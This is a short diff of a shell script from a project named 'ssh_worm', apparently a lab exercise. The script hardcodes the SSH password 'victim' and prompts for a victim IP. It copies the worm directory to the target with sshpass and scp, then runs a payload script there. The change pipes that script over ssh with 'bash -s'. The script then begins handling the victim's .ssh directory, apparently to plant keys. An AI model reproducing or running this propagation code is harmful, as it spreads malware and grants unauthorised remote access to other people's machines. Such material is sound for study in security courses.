@@ -4,7 +4,7 @@ export SSHPASS='victim'
 
 read -p "Enter Victim IP Address: " IP_Address
 sshpass -e scp -r ../ssh_worm victim@"$IP_Address":/home/victim/Desktop/
-sshpass -e ssh victim@"$IP_Address" 'cd /home/victim/Desktop/ssh_worm && ./task2.sh'
+sshpass -e ssh victim@"$IP_Address" 'bash -s' < task2.sh
 
 # publickey
 SSH_PATH="/home/victim/.ssh"
